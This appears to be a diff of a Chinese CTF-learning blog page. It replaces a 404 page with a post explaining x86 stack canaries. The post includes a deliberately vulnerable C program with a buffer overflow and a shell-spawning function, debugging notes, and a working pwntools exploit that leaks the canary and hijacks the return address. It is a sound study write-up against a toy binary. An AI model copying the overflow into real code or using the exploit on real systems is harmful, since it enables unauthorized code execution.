@@ -17,21 +17,25 @@
   <meta http-equiv="window-target" content="_top" />
   
   
-  <title>404 Not Found：该页无法显示 | Ld1ng</title>
-  <meta property="og:type" content="website">
-<meta property="og:title" content="404 Not Found：该页无法显示">
-<meta property="og:url" content="http://ld1ng.com/404.html">
+  <title>学习canary | Ld1ng</title>
+  <meta name="description" content="0x00 前言刚开始接触canary，先不谈题目中如何利用，只记一下我对它浅显的理解 0x01 介绍什么是canary呢？ Canary 的本意是金丝雀，来源于英国矿井工人用来探查井下气体是否有毒的金丝雀笼子。工人们每次下井都会带上一只金丝雀。如果井下的气体有毒，金丝雀由于对毒性敏感就会停止鸣叫甚至死亡，从而使工人们得到预警。  这里的canary也具有相似的功能，放在栈底用于检测是否发生栈溢出，">
+<meta property="og:type" content="article">
+<meta property="og:title" content="学习canary">
+<meta property="og:url" content="http://ld1ng.com/2020/07/01/canary/index.html">
 <meta property="og:site_name" content="Ld1ng">
+<meta property="og:description" content="0x00 前言刚开始接触canary，先不谈题目中如何利用，只记一下我对它浅显的理解 0x01 介绍什么是canary呢？ Canary 的本意是金丝雀，来源于英国矿井工人用来探查井下气体是否有毒的金丝雀笼子。工人们每次下井都会带上一只金丝雀。如果井下的气体有毒，金丝雀由于对毒性敏感就会停止鸣叫甚至死亡，从而使工人们得到预警。  这里的canary也具有相似的功能，放在栈底用于检测是否发生栈溢出，">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2020-05-07T11:34:24.585Z">
-<meta property="article:modified_time" content="2019-08-02T02:17:12.000Z">
+<meta property="og:image" content="https://i.loli.net/2020/07/01/O7kHLestKch9dTE.png">
+<meta property="og:image" content="https://i.loli.net/2020/07/01/Bx4Ld7kSaJ3EGHl.png">
+<meta property="og:image" content="https://i.loli.net/2020/07/01/PiuQAro8GFBZ9W3.png">
+<meta property="article:published_time" content="2020-06-30T16:00:00.000Z">
+<meta property="article:modified_time" content="2020-07-01T09:16:53.687Z">
 <meta property="article:author" content="Ld1ng">
-<meta property="article:tag" content="CTF">
-<meta property="article:tag" content="code">
-<meta property="article:tag" content="CUMT">
+<meta property="article:tag" content="KNOWLEDGE">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2020/07/01/O7kHLestKch9dTE.png">
   <!-- Canonical links -->
-  <link rel="canonical" href="http://ld1ng.com/404.html">
+  <link rel="canonical" href="http://ld1ng.com/2020/07/01/canary/index.html">
   
     <link rel="alternate" href="/atom.xml" title="Ld1ng" type="application/atom+xml">
   
@@ -401,16 +405,25 @@
 
   
   
+<aside class="sidebar sidebar-toc collapse" id="collapseToc" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    <nav id="toc" class="article-toc">
+      <h3 class="toc-title">Catalogue</h3>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-前言"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-介绍"><span class="toc-number">1.0.1.</span> <span class="toc-text">0x01 介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-原理"><span class="toc-number">1.0.2.</span> <span class="toc-text">0x02 原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-leak-canary"><span class="toc-number">1.0.3.</span> <span class="toc-text">0x03 leak canary</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-exp"><span class="toc-number">1.0.4.</span> <span class="toc-text">0x04 exp</span></a></li></ol></li></ol></li></ol>
+    </nav>
+  </div>
+</aside>
+
 <main class="main" role="main">
   <div class="content">
-  <article id="page-" class="article article-type-page" itemscope itemtype="http://schema.org/BlogPosting">
+  <article id="post-canary" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
     
     <div class="article-header">
       
         
   
     <h1 class="article-title" itemprop="name">
-      404 Not Found：该页无法显示
+      学习canary
     </h1>
   
 
@@ -418,12 +431,22 @@
       <div class="article-meta">
         <span class="article-date">
     <i class="icon icon-calendar-check"></i>
-	<a href="/404.html" class="article-date">
-	  <time datetime="2020-05-07T11:34:24.585Z" itemprop="datePublished">2020-05-07</time>
+	<a href="/2020/07/01/canary/" class="article-date">
+	  <time datetime="2020-06-30T16:00:00.000Z" itemprop="datePublished">2020-07-01</time>
 	</a>
 </span>
         
+  <span class="article-category">
+    <i class="icon icon-folder"></i>
+    <a class="article-category-link" href="/categories/LEARNING/">LEARNING</a>
+  </span>
+
         
+  <span class="article-tag">
+    <i class="icon icon-tags"></i>
+	<a class="article-tag-link" href="/tags/KNOWLEDGE/" rel="tag">KNOWLEDGE</a>
+  </span>
+
 
         
 	<span class="article-read hidden-xs">
@@ -434,20 +457,60 @@
 	</span>
 
 
-        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/404.html#comments" class="article-comment-link">Comments</a></span>
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2020/07/01/canary/#comments" class="article-comment-link">Comments</a></span>
         
 	
-		<span class="post-wordcount hidden-xs" itemprop="wordCount">Word Count: 0(words)</span>
+		<span class="post-wordcount hidden-xs" itemprop="wordCount">Word Count: 1.1k(words)</span>
 	
 	
-		<span class="post-readcount hidden-xs" itemprop="timeRequired">Read Count: 1(minutes)</span>
+		<span class="post-readcount hidden-xs" itemprop="timeRequired">Read Count: 4(minutes)</span>
 	
 
       </div>
     </div>
     <div class="article-entry marked-body" itemprop="articleBody">
       
-        <script type="text/javascript" src="//www.qq.com/404/search_children.js" charset="utf-8" homePageUrl="<%- config.url %>" homePageName="回到我的主页"></script>
+        <h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>刚开始接触canary，先不谈题目中如何利用，只记一下我对它浅显的理解</p>
+<h3 id="0x01-介绍"><a href="#0x01-介绍" class="headerlink" title="0x01 介绍"></a>0x01 介绍</h3><p>什么是canary呢？</p>
+<p>Canary 的本意是金丝雀，来源于英国矿井工人用来探查井下气体是否有毒的金丝雀笼子。工人们每次下井都会带上一只金丝雀。如果井下的气体有毒，金丝雀由于对毒性敏感就会停止鸣叫甚至死亡，从而使工人们得到预警。 </p>
+<p>这里的canary也具有相似的功能，放在栈底用于检测是否发生栈溢出，它的出现很大程度上增加了栈溢出攻击的难度，并且由于它几乎并不消耗系统资源，所以现在成了 Linux 下保护机制的标配。</p>
+<hr>
+<h3 id="0x02-原理"><a href="#0x02-原理" class="headerlink" title="0x02 原理"></a>0x02 原理</h3><p>x86栈结构：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">     High  </span><br><span class="line">     Address |                 |  </span><br><span class="line">             +-----------------+</span><br><span class="line">             | args            |</span><br><span class="line">             +-----------------+</span><br><span class="line">             | <span class="keyword">return</span> address  |</span><br><span class="line">             +-----------------+</span><br><span class="line">             | old ebp         |</span><br><span class="line">   ebp =&gt;    +-----------------+</span><br><span class="line">             | ebx             |</span><br><span class="line"> ebp<span class="number">-4</span> =&gt;    +-----------------+</span><br><span class="line">             | unknown         |</span><br><span class="line"> ebp<span class="number">-8</span> =&gt;    +-----------------+</span><br><span class="line">             | canary value    |</span><br><span class="line">ebp<span class="number">-12</span> =&gt;    +-----------------+</span><br><span class="line">             | 局部变量         |</span><br><span class="line">     Low     |                 |</span><br><span class="line">     Address</span><br></pre></td></tr></table></figure>
+
+<p>主要说一下x86下的canary，x64类似</p>
+<p>栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让 shellcode 能够得到执行。</p>
+<p>当启用栈保护后，函数开始执行的时候会先往栈底插入 cookie 信息，当函数真正返回的时候会验证 cookie 信息是否合法 (栈帧销毁前测试该值是否被改变)，如果不合法就停止程序运行 (栈溢出发生)。</p>
+<p>攻击者在覆盖返回地址的时候往往也会将 cookie 信息给覆盖掉，导致栈保护检查失败而阻止 shellcode 的执行，避免漏洞利用成功。</p>
+<h3 id="0x03-leak-canary"><a href="#0x03-leak-canary" class="headerlink" title="0x03 leak canary"></a>0x03 leak canary</h3><p>之前有个题目比较简单<a href="http://ld1ng.com/2020/06/03/ADWorld-pwn/#0x04-Mary-Morton">Mary_Morton</a>，存在明显的格式化字符串漏洞，可以泄露canary的值</p>
+<p>这里讲一下另外一种方法</p>
+<p>为了便于理解，写一个简单的程序自己调一下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getshell</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">2</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">0x200</span>);</span><br><span class="line">        <span class="built_in">puts</span>(buf);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    init();</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Hello Hacker!"</span>);</span><br><span class="line">    vuln();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -no-pie canary.c -o canary //无PIE保护</span><br></pre></td></tr></table></figure>
+
+<p>编译之后可以运行，输入两次数据结束</p>
+<p>职业病，拖进IDA看一下</p>
+<p><img src="https://i.loli.net/2020/07/01/O7kHLestKch9dTE.png" alt="image-20200701162154035"></p>
+<p>主要看一下vuln函数，<code>buf</code>是我们开辟的缓冲区，大小70H（十进制112），但是我们只定义了100个大小，为什么会多12字节的大小呢</p>
+<p>然后v3很奇怪，源码中并没有定义这个变量，看到最后return，自己和自己异或，很明显做了一次检查，只有两次相等时才能return 0，所以可以知道v3就是canary</p>
+<p>再看v3在栈中的位置<code>ebp-C</code>正好符合条件。</p>
+<p>输入100个字符之后就是canary</p>
+<p>为了进一步搞清楚泄露canary的原理，可以gdb调试一下</p>
+<p><img src="https://i.loli.net/2020/07/01/Bx4Ld7kSaJ3EGHl.png" alt="image-20200701163648373"></p>
+<p>左面是输入了99个’A’，右面输入100个’A’，可以明显看出我画红线位置的不同，其中0x0a是100个A时候的换行符，而buf大小刚好是100</p>
+<ul>
+<li>当输入99个A时，加上0x0a的换行标记，正好100个字符占满buf</li>
+<li>当输入100个A时，buf刚好被占满，这时0x0a的换行符覆盖掉了后四位字节的最低位（如图所示），由于32位程序中，canary为四个字节，所以0x0a覆盖掉的就是canary的最低位0x00</li>
+</ul>
+<blockquote>
+<p>（存疑，个人理解）</p>
+<p>canary最低位0x00起到截断字符串的作用，在有些函数处理时，会把这个字符当做结束符，即为了防止printf等函数读出它的值，所以说，如果canary真的只靠这个来防御的话，那么只需要覆盖掉0x00，就可以读到它的值了</p>
+</blockquote>
+<h3 id="0x04-exp"><a href="#0x04-exp" class="headerlink" title="0x04 exp"></a>0x04 exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.binary = <span class="string">'can'</span></span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">io = process(<span class="string">'./canary'</span>)</span><br><span class="line">get_shell=ELF(<span class="string">"./canary"</span>).sym[<span class="string">"getshell"</span>]</span><br><span class="line"><span class="comment">#获得getshell的地址</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.recvuntil(<span class="string">"Hello Hacker!\n"</span>)</span><br><span class="line">payload = <span class="string">"A"</span>*<span class="number">100</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">"A"</span>*<span class="number">100</span>)</span><br><span class="line">Canary = u32(io.recv(<span class="number">4</span>))<span class="number">-0xa</span> <span class="comment">#继续接收后四位数据，并减掉0x0a</span></span><br><span class="line">log.info(<span class="string">"Canary:"</span>+hex(Canary))</span><br><span class="line">payload = <span class="string">b"\x90"</span>*<span class="number">100</span>+p32(Canary)+<span class="string">b"\x90"</span>*<span class="number">12</span>+p32(get_shell)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recv()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/07/01/PiuQAro8GFBZ9W3.png" alt="image-20200701170620675"></p>
+<p>成功~</p>
 
       
     </div>
@@ -457,7 +520,7 @@
     
     <li class="post-copyright-link hidden-xs">
       <strong>本文链接：</strong>
-      <a href="http://ld1ng.com/404.html" title="404 Not Found：该页无法显示">http://ld1ng.com/404.html</a>
+      <a href="http://ld1ng.com/2020/07/01/canary/" title="学习canary">http://ld1ng.com/2020/07/01/canary/</a>
     </li>
     
     <li class="post-copyright-license">
@@ -488,12 +551,37 @@
   </article>
   
     
+  <section id="comments">
+  	
+      <div id="vcomments"></div>
+    
+  </section>
+
 
   
 </div>
 
   <nav class="bar bar-footer clearfix" data-stick-bottom>
   <div class="bar-inner">
+  
+  <ul class="pager pull-left">
+    
+    
+    <li class="next">
+      <a href="/2020/06/20/Graduation/" title="观毕业季有感"><span>Older&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
+    </li>
+    
+    
+    <li class="toggle-toc">
+      <a class="toggle-btn collapsed" data-toggle="collapse" href="#collapseToc" aria-expanded="false" title="Catalogue" role="button">
+        <span>[&nbsp;</span><span>Catalogue</span>
+        <i class="text-collapsed icon icon-anchor"></i>
+        <i class="text-in icon icon-close"></i>
+        <span>]</span>
+      </a>
+    </li>
+    
+  </ul>
   
   
   <!-- Button trigger modal -->
@@ -615,6 +703,39 @@ window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
 
 
 
+
+   
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+   
+    
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/valine"></script>
+  <script type="text/javascript">
+  var GUEST = ['nick', 'mail', 'link'];
+  var meta = 'nick,mail,link';
+  meta = meta.split(',').filter(function(item) {
+    return GUEST.indexOf(item) > -1;
+  });
+  new Valine({
+    el: '#vcomments',
+    verify: false,
+    notify: false,
+    appId: 'axhOjPzscogBppPjn36rtaAv-gzGzoHsz',
+    appKey: 'gMB6OHiHJvIxpnVtuoYxyPhk',
+    placeholder: 'Just go go',
+    avatar: 'wavatar',
+    meta: meta,
+    pageSize: '10' || 10,
+    visitor: false
+  });
+  </script>
+
+     
 
 
 
